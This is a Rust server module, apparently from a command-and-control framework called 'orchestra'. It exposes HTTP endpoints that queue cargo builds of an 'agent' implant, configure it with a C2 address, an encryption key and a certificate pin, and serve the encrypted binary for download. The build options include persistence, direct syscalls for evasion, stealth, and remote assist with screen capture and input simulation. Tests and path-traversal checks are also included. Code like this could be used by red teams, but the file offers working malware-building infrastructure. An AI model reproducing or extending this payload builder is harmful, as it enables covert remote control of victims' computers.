use axum::{extract::State, http::StatusCode, response::IntoResponse, Json};
use chrono::{Datelike, Utc};
use serde::{Deserialize, Serialize};
use std::collections::HashMap;
use std::path::{Path, PathBuf};
use std::process::Command;
use std::sync::OnceLock;
use std::sync::{Arc, Mutex};
use tokio::sync::mpsc;
use uuid::Uuid;

use crate::auth::AuthenticatedUser;
use crate::state::AppState;

#[derive(Deserialize, Debug, Clone)]
pub struct BuildRequest {
    pub os: String,
    pub arch: String,
    pub features: BuildFeatures,
    pub host: String,
    pub port: u16,
    pub pin: String,
    pub key: String,
    pub output_dir: Option<String>,
}

#[derive(Deserialize, Debug, Clone)]
pub struct BuildFeatures {
    pub persistence: bool,
    /// Enables `direct-syscalls` in the agent (maps to the `direct-syscalls` Cargo feature).
    pub direct_syscalls: bool,
    /// Enables `remote-assist` in the agent (screen capture + input simulation).
    pub remote_assist: bool,
    pub stealth: bool,
}

#[derive(Serialize)]
pub struct BuildResponse {
    #[serde(skip_serializing_if = "Option::is_none")]
    pub job_id: Option<String>,
    #[serde(skip_serializing_if = "Option::is_none")]
    pub log: Option<String>,
    #[serde(skip_serializing_if = "Option::is_none")]
    pub error: Option<String>,
    #[serde(skip_serializing_if = "Option::is_none")]
    pub status: Option<String>,
}

#[derive(Clone)]
pub struct JobState {
    pub status: String,
    pub log: String,
    pub output_path: Option<String>,
    pub error: Option<String>,
    /// Unix timestamp (seconds) when the job transitioned to Running.
    pub started_at: u64,
}

pub struct BuildJob {
    pub job_id: String,
    pub req: BuildRequest,
    pub operator: String,
    pub server_build_dir: PathBuf,
    pub state_ref: Arc<AppState>,
}

static JOB_MAP: OnceLock<Arc<Mutex<HashMap<String, JobState>>>> = OnceLock::new();
static JOB_SENDER: OnceLock<mpsc::Sender<BuildJob>> = OnceLock::new();

pub fn init_build_queue(workers: usize, build_dir: PathBuf, retention_days: u32) {
    if JOB_SENDER.get().is_some() {
        return;
    }

    let map = Arc::new(Mutex::new(HashMap::new()));
    let _ = JOB_MAP.set(map.clone());

    let (tx, rx) = mpsc::channel::<BuildJob>(100);
    let rx = Arc::new(tokio::sync::Mutex::new(rx));
    let _ = JOB_SENDER.set(tx);

    for i in 0..workers.max(1) {
        let map_clone = map.clone();
        let rx = rx.clone();
        tokio::spawn(async move {
            loop {
                let job = {
                    let mut rx_lock = rx.lock().await;
                    rx_lock.recv().await
                };
                let Some(job) = job else {
                    break;
                };

                {
                    let mut m = map_clone.lock().unwrap();
                    if let Some(s) = m.get_mut(&job.job_id) {
                        s.status = "Running".to_string();
                        s.error = None;
                        s.started_at = std::time::SystemTime::now()
                            .duration_since(std::time::UNIX_EPOCH)
                            .unwrap_or_default()
                            .as_secs();
                        s.log
                            .push_str(&format!("[Worker {}] Started job {}\n", i, job.job_id));
                    }
                }

                let BuildJob {
                    job_id,
                    req,
                    operator,
                    server_build_dir,
                    state_ref: _,
                } = job;

                let res = tokio::task::spawn_blocking({
                    let map2 = map_clone.clone();
                    let jid = job_id.clone();
                    move || execute_build_safely(jid, req, operator, server_build_dir, map2)
                })
                .await
                .unwrap();

                let (outcome_str, fs_path, error) = match res {
                    Ok(path) => ("Completed", Some(path), None),
                    Err(e) => {
                        let error = e.to_string();
                        let mut m = map_clone.lock().unwrap();
                        if let Some(s) = m.get_mut(&job_id) {
                            s.log.push_str(&format!("\nBuild failed: {}\n", error));
                        }
                        ("Failed", None, Some(error))
                    }
                };

                let mut m = map_clone.lock().unwrap();
                if let Some(s) = m.get_mut(&job_id) {
                    s.status = outcome_str.to_string();
                    s.output_path = fs_path;
                    s.error = error;
                    if outcome_str == "Completed" {
                        s.log.push_str("\n--- Build Successful ---\n");
                    }
                }
            }
        });
    }

    // Retention task
    tokio::spawn(async move {
        loop {
            tokio::time::sleep(std::time::Duration::from_secs(3600)).await;
            let mut m = map.lock().unwrap();
            m.retain(|_, v| {
                if v.status == "Queued" || v.status == "Running" {
                    return true;
                }
                // Remove completed/failed jobs older than 24 hours (M-35 fix).
                let now_secs = std::time::SystemTime::now()
                    .duration_since(std::time::UNIX_EPOCH)
                    .unwrap_or_default()
                    .as_secs();
                let elapsed = now_secs.saturating_sub(v.started_at);
                elapsed < 86400
            });
            // Cleanup FS
            if let Ok(entries) = std::fs::read_dir(&build_dir) {
                let now = std::time::SystemTime::now();
                let retention = std::time::Duration::from_secs(retention_days as u64 * 86400);
                for entry in entries.flatten() {
                    if let Ok(meta) = entry.metadata() {
                        if let Ok(modified) = meta.modified() {
                            if now.duration_since(modified).unwrap_or_default() > retention {
                                let _ = std::fs::remove_dir_all(entry.path());
                            }
                        }
                    }
                }
            }
        }
    });
}

pub async fn handle_build(
    State(state): State<Arc<AppState>>,
    axum::extract::Extension(user): axum::extract::Extension<AuthenticatedUser>,
    Json(req): Json<BuildRequest>,
) -> Result<Json<BuildResponse>, (StatusCode, Json<BuildResponse>)> {
    if req.host.is_empty() || req.port == 0 || req.key.is_empty() || req.pin.is_empty() {
        return Err((
            StatusCode::BAD_REQUEST,
            Json(BuildResponse {
                job_id: None,
                log: None,
                status: None,
                error: Some("Missing required fields".into()),
            }),
        ));
    }
    if let Err(err) = validate_cert_pin(&req.pin) {
        return Err((
            StatusCode::BAD_REQUEST,
            Json(BuildResponse {
                job_id: None,
                log: None,
                status: None,
                error: Some(err.to_string()),
            }),
        ));
    }

    // Initialize lazily if not done
    if JOB_SENDER.get().is_none() {
        // As a fallback to avoid crash if not properly initialized in main
        init_build_queue(1, PathBuf::from("/var/lib/orchestra/builds"), 7);
    }

    let job_id = Uuid::new_v4().to_string();

    state.audit.record_simple(
        "BUILDER",
        &user.0,
        "EnqueueBuild",
        &format!("job_id={job_id}"),
        common::Outcome::Success,
    );

    let sender = JOB_SENDER.get().unwrap();
    let map = JOB_MAP.get().unwrap();

    {
        let mut m = map.lock().unwrap();
        m.insert(
            job_id.clone(),
            JobState {
                status: "Queued".to_string(),
                log: format!("Job {} enqueued.\n", job_id),
                output_path: None,
                error: None,
                started_at: 0,
            },
        );
    }

    if sender
        .send(BuildJob {
            job_id: job_id.clone(),
            req,
            operator: user.0,
            server_build_dir: state.config.builds_output_dir.clone(), // Get from app state
            state_ref: state.clone(),
        })
        .await
        .is_err()
    {
        let mut m = map.lock().unwrap();
        if let Some(s) = m.get_mut(&job_id) {
            s.status = "Failed".to_string();
            s.error = Some("build queue is not accepting jobs".to_string());
            s.log.push_str("build queue is not accepting jobs\n");
        }
        return Err((
            StatusCode::SERVICE_UNAVAILABLE,
            Json(BuildResponse {
                job_id: Some(job_id),
                log: None,
                status: Some("Failed".into()),
                error: Some("build queue is not accepting jobs".into()),
            }),
        ));
    }

    Ok(Json(BuildResponse {
        job_id: Some(job_id),
        log: None,
        status: Some("Queued".into()),
        error: None,
    }))
}

pub async fn handle_build_status(
    axum::extract::Path(job_id): axum::extract::Path<String>,
) -> Result<Json<BuildResponse>, (StatusCode, String)> {
    if let Some(map) = JOB_MAP.get() {
        let m = map.lock().unwrap();
        if let Some(s) = m.get(&job_id) {
            return Ok(Json(BuildResponse {
                job_id: Some(job_id),
                log: Some(s.log.clone()),
                status: Some(s.status.clone()),
                error: s.error.clone(),
            }));
        }
    }
    Err((StatusCode::NOT_FOUND, "Job not found".to_string()))
}

fn execute_build_safely(
    job_id: String,
    req: BuildRequest,
    _operator: String,
    base_build_dir: PathBuf,
    map_rc: Arc<Mutex<HashMap<String, JobState>>>,
) -> anyhow::Result<String> {
    let append_log = |line: &str| {
        if let Ok(mut m) = map_rc.lock() {
            if let Some(s) = m.get_mut(&job_id) {
                s.log.push_str(line);
                s.log.push('\n');
            }
        }
    };

    let workspace = Path::new(env!("CARGO_MANIFEST_DIR")).parent().unwrap();
    let temp_dir = tempfile::tempdir()?;
    let tmp_path = temp_dir.path();

    append_log(&format!(
        "Creating temporary sandbox at {}",
        tmp_path.display()
    ));

    copy_workspace_for_build(workspace, tmp_path)?;

    let profile = build_profile_from_request(&job_id, &req)?;

    append_log("Executing cargo build within sandbox limits...");

    let mut cmd = Command::new("cargo");
    cmd.current_dir(tmp_path);
    cmd.arg("run")
        .arg("--release")
        .arg("-p")
        .arg("builder")
        .arg("--")
        .arg("build")
        .arg("temp_profile");

    let profile_dir = tmp_path.join("profiles");
    std::fs::create_dir_all(&profile_dir)?;
    std::fs::write(
        profile_dir.join("temp_profile.toml"),
        toml::to_string_pretty(&profile)?,
    )?;

    #[cfg(unix)]
    {
        use std::os::unix::process::CommandExt;
        unsafe {
            cmd.pre_exec(|| {
                libc::setrlimit(
                    libc::RLIMIT_AS,
                    &libc::rlimit {
                        rlim_cur: 4_000_000_000,
                        rlim_max: 4_000_000_000,
                    },
                );
                libc::setrlimit(
                    libc::RLIMIT_CPU,
                    &libc::rlimit {
                        rlim_cur: 300,
                        rlim_max: 300,
                    },
                );
                Ok(())
            });
        }
    }

    let output = cmd.output()?;
    let stdout = String::from_utf8_lossy(&output.stdout);
    let stderr = String::from_utf8_lossy(&output.stderr);

    append_log(&format!("stdout:\n{}", stdout));
    if !stderr.is_empty() {
        append_log(&format!("stderr:\n{}", stderr));
    }

    if !output.status.success() {
        anyhow::bail!("Build process failed.");
    }

    let enc_path = tmp_path.join("dist").join(format!("{job_id}.enc"));
    if !enc_path.exists() {
        anyhow::bail!("encrypted output not found at {}", enc_path.display());
    }

    // Choose output directory
    let mut out_dir = base_build_dir.clone();
    if let Some(user_dir) = req.output_dir {
        if !user_dir.trim().is_empty() {
            let requested = PathBuf::from(user_dir.trim());
            // Restrict build artifacts to subdirectories of the configured
            // build directory.  Accepting an arbitrary absolute path would
            // allow an authenticated operator to write artifacts to any
            // location writable by the server process (e.g. /etc, /tmp/evil).
            //
            // Canonicalize both sides so that `../` traversal sequences are
            // resolved before comparison.  If the requested path does not yet
            // exist (canonicalize returns Err), fall back to normalizing the
            // lexical path to catch obvious traversal attempts.
            let canonical_base = std::fs::canonicalize(&base_build_dir)
                .unwrap_or_else(|_| base_build_dir.clone());
            let canonical_requested = std::fs::canonicalize(&requested)
                .unwrap_or_else(|_| {
                    // Path doesn't exist yet; normalize lexically by resolving
                    // `.` and `..` components from the path root so that e.g.
                    // `/builds/../etc` correctly resolves to `/etc` (outside
                    // the build dir) rather than appearing to be a subdirectory.
                    let mut acc = PathBuf::new();
                    for component in requested.components() {
                        match component {
                            std::path::Component::RootDir => acc.push("/"),
                            std::path::Component::Prefix(p) => acc.push(p.as_os_str()),
                            std::path::Component::CurDir => {} // skip `.`
                            std::path::Component::ParentDir => { acc.pop(); }
                            std::path::Component::Normal(p) => acc.push(p),
                        }
                    }
                    acc
                });
            if canonical_requested.starts_with(&canonical_base) {
                out_dir = requested;
            } else {
                anyhow::bail!(
                    "output_dir '{}' must be within the configured builds directory '{}'",
                    user_dir.trim(),
                    base_build_dir.display()
                );
            }
        }
    }

    // YYYY-MM-DD_jobid
    let today = Utc::now();
    let folder_name = format!(
        "{:04}-{:02}-{:02}_{}",
        today.year(),
        today.month(),
        today.day(),
        &job_id[..8]
    );
    let final_dir = out_dir.join(&folder_name);

    std::fs::create_dir_all(&final_dir)
        .map_err(|e| anyhow::anyhow!("Failed to create output dir {:?}: {}", final_dir, e))?;

    let final_dest = final_dir.join(format!("agent-{job_id}.enc"));
    std::fs::copy(&enc_path, &final_dest)?;

    append_log(&format!("Saved successfully to: {}", final_dest.display()));

    Ok(final_dest.to_string_lossy().to_string())
}

fn build_profile_from_request(
    job_id: &str,
    req: &BuildRequest,
) -> anyhow::Result<builder::config::PayloadConfig> {
    validate_cert_pin(&req.pin)?;

    let c2_addr = format!("{}:{}", req.host, req.port);
    let mut features = vec!["outbound-c".to_string()];
    if req.features.persistence {
        features.push("persistence".to_string());
    }
    if req.features.direct_syscalls {
        features.push("direct-syscalls".to_string());
    }
    if req.features.remote_assist {
        features.push("remote-assist".to_string());
    }
    if req.features.stealth {
        features.push("stealth".to_string());
    }

    Ok(builder::config::PayloadConfig {
        target_os: req.os.clone(),
        target_arch: req.arch.clone(),
        c2_address: c2_addr,
        encryption_key: req.key.clone(),
        hmac_key: None,
        // Derive a separate PSK from the operator key so the C2 shared secret
        // and the encryption key are never the same value (M-36 fix).
        c_server_secret: Some({
            use sha2::{Digest, Sha256};
            let mut hasher = Sha256::new();
            hasher.update(b"orchestra-c2-psk-derivation");
            hasher.update(req.key.as_bytes());
            format!("{:x}", hasher.finalize())
        }),
        server_cert_fingerprint: Some(req.pin.clone()),
        features,
        output_name: Some(job_id.to_string()),
        package: "agent".to_string(),
        bin_name: Some("agent-standalone".to_string()),
    })
}

fn validate_cert_pin(pin: &str) -> anyhow::Result<()> {
    let pin = pin.trim();
    if pin.len() != 64 || !pin.chars().all(|c| c.is_ascii_hexdigit()) {
        anyhow::bail!("pin must be a SHA-256 certificate fingerprint encoded as 64 hex characters");
    }
    Ok(())
}

fn copy_workspace_for_build(src_root: &Path, dst_root: &Path) -> anyhow::Result<()> {
    for entry in std::fs::read_dir(src_root)? {
        let entry = entry?;
        let name = entry.file_name();
        let name = name.to_string_lossy();
        if matches!(
            name.as_ref(),
            "target" | ".git" | ".vscode" | "dist" | "profiles"
        ) {
            continue;
        }
        let dst = dst_root.join(name.as_ref());
        copy_path_recursive(&entry.path(), &dst)?;
    }
    Ok(())
}

fn copy_path_recursive(src: &Path, dst: &Path) -> anyhow::Result<()> {
    let file_type = std::fs::symlink_metadata(src)?.file_type();
    if file_type.is_symlink() {
        return Ok(());
    }
    if file_type.is_dir() {
        std::fs::create_dir_all(dst)?;
        for entry in std::fs::read_dir(src)? {
            let entry = entry?;
            copy_path_recursive(&entry.path(), &dst.join(entry.file_name()))?;
        }
    } else if file_type.is_file() {
        if let Some(parent) = dst.parent() {
            std::fs::create_dir_all(parent)?;
        }
        std::fs::copy(src, dst)?;
    }
    Ok(())
}

pub async fn handle_download(
    axum::extract::Path(job_id): axum::extract::Path<String>,
) -> Result<impl IntoResponse, StatusCode> {
    if !job_id.chars().all(|c| c.is_alphanumeric() || c == '-') {
        return Err(StatusCode::BAD_REQUEST);
    }

    let file_path = if let Some(map) = JOB_MAP.get() {
        let m = map.lock().unwrap();
        let Some(state) = m.get(&job_id) else {
            return Err(StatusCode::NOT_FOUND);
        };
        if state.status != "Completed" {
            return Err(StatusCode::NOT_FOUND);
        }
        state.output_path.clone()
    } else {
        None
    }
    .ok_or(StatusCode::NOT_FOUND)?;

    let file = tokio::fs::read(&file_path)
        .await
        .map_err(|_| StatusCode::NOT_FOUND)?;
    let filename = Path::new(&file_path)
        .file_name()
        .and_then(|s| s.to_str())
        .map(str::to_owned)
        .unwrap_or_else(|| format!("agent-{job_id}.enc"));

    let mut headers = axum::http::HeaderMap::new();
    headers.insert(
        axum::http::header::CONTENT_TYPE,
        axum::http::header::HeaderValue::from_static("application/octet-stream"),
    );
    headers.insert(
        axum::http::header::CONTENT_DISPOSITION,
        axum::http::header::HeaderValue::from_str(&format!(
            "attachment; filename=\"{}\"",
            filename
        ))
        .unwrap(),
    );

    Ok((headers, file))
}

#[cfg(test)]
mod tests {
    use super::*;

    fn request() -> BuildRequest {
        BuildRequest {
            os: "linux".into(),
            arch: "x86_64".into(),
            features: BuildFeatures {
                persistence: true,
                direct_syscalls: false,
                remote_assist: false,
                stealth: false,
            },
            host: "127.0.0.1".into(),
            port: 8444,
            pin: "0123456789abcdef0123456789abcdef0123456789abcdef0123456789abcdef".into(),
            key: "aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa=".into(),
            output_dir: None,
        }
    }

    #[test]
    fn server_build_profile_targets_outbound_agent_with_pin() {
        let profile = build_profile_from_request("job123", &request()).unwrap();
        assert_eq!(profile.package, "agent");
        assert_eq!(profile.bin_name.as_deref(), Some("agent-standalone"));
        assert_eq!(profile.output_name.as_deref(), Some("job123"));
        assert_eq!(
            profile.server_cert_fingerprint.as_deref(),
            Some("0123456789abcdef0123456789abcdef0123456789abcdef0123456789abcdef")
        );
        assert!(profile.features.contains(&"outbound-c".to_string()));
        assert!(profile.features.contains(&"persistence".to_string()));
    }

    #[test]
    fn invalid_cert_pin_is_rejected() {
        assert!(validate_cert_pin("not-a-pin").is_err());
    }

    #[test]
    fn workspace_copy_excludes_target_directory() {
        let src = tempfile::tempdir().unwrap();
        let dst = tempfile::tempdir().unwrap();
        std::fs::write(src.path().join("Cargo.toml"), "[workspace]\n").unwrap();
        std::fs::create_dir_all(src.path().join("agent/src")).unwrap();
        std::fs::write(src.path().join("agent/src/lib.rs"), "").unwrap();
        std::fs::create_dir_all(src.path().join("target/debug")).unwrap();
        std::fs::write(src.path().join("target/debug/large"), "ignore").unwrap();

        copy_workspace_for_build(src.path(), dst.path()).unwrap();

        assert!(dst.path().join("Cargo.toml").exists());
        assert!(dst.path().join("agent/src/lib.rs").exists());
        assert!(!dst.path().join("target").exists());
    }

    // ── output_dir restriction tests ────────────────────────────────────────

    /// Helper: call only the output_dir validation logic extracted from
    /// `execute_build_safely` without running an actual build.
    ///
    /// Returns `Ok(resolved_out_dir)` on success or `Err(msg)` on rejection.
    fn check_output_dir(
        base_build_dir: &std::path::Path,
        user_dir: Option<&str>,
    ) -> anyhow::Result<PathBuf> {
        let mut out_dir = base_build_dir.to_path_buf();

        if let Some(user_dir) = user_dir {
            if !user_dir.trim().is_empty() {
                let requested = PathBuf::from(user_dir.trim());
                let canonical_base = std::fs::canonicalize(base_build_dir)
                    .unwrap_or_else(|_| base_build_dir.to_path_buf());
                let canonical_requested = std::fs::canonicalize(&requested).unwrap_or_else(|_| {
                    let mut acc = PathBuf::new();
                    for component in requested.components() {
                        match component {
                            std::path::Component::RootDir => acc.push("/"),
                            std::path::Component::Prefix(p) => acc.push(p.as_os_str()),
                            std::path::Component::CurDir => {}
                            std::path::Component::ParentDir => {
                                acc.pop();
                            }
                            std::path::Component::Normal(p) => acc.push(p),
                        }
                    }
                    acc
                });
                if canonical_requested.starts_with(&canonical_base) {
                    out_dir = requested;
                } else {
                    anyhow::bail!(
                        "output_dir '{}' must be within the configured builds directory '{}'",
                        user_dir.trim(),
                        base_build_dir.display()
                    );
                }
            }
        }

        Ok(out_dir)
    }

    /// A subdirectory of the configured build dir must be accepted.
    #[test]
    fn output_dir_accepts_subdirectory_of_build_dir() {
        let base = tempfile::tempdir().unwrap();
        let sub = base.path().join("2024-01-01_job");
        std::fs::create_dir_all(&sub).unwrap();
        let result = check_output_dir(base.path(), Some(sub.to_str().unwrap()));
        assert!(result.is_ok(), "subdirectory of build dir must be accepted");
    }

    /// An absolute path that is NOT under the configured build dir must be
    /// rejected with a clear error.
    #[test]
    fn output_dir_rejects_absolute_path_outside_build_dir() {
        let base = tempfile::tempdir().unwrap();
        let outside = tempfile::tempdir().unwrap();
        // outside is a completely different temp dir — not a subdir of base.
        let result = check_output_dir(base.path(), Some(outside.path().to_str().unwrap()));
        assert!(
            result.is_err(),
            "absolute path outside build dir must be rejected"
        );
        assert!(
            result.unwrap_err().to_string().contains("must be within"),
            "error message must explain the restriction"
        );
    }

    /// A path-traversal attempt using `../` must be rejected even if the
    /// resulting path is not the same as passing an absolute outside path.
    #[test]
    fn output_dir_rejects_parent_dir_traversal() {
        let base = tempfile::tempdir().unwrap();
        // Construct a traversal path: <base>/../evil — resolves to the parent of base.
        let traversal = format!("{}/../evil", base.path().display());
        let result = check_output_dir(base.path(), Some(&traversal));
        assert!(
            result.is_err(),
            "parent-dir traversal in output_dir must be rejected"
        );
    }

    /// `None` (not supplied) must silently default to the configured build dir.
    #[test]
    fn output_dir_defaults_to_base_when_none() {
        let base = tempfile::tempdir().unwrap();
        let result = check_output_dir(base.path(), None).unwrap();
        assert_eq!(result, base.path());
    }
}
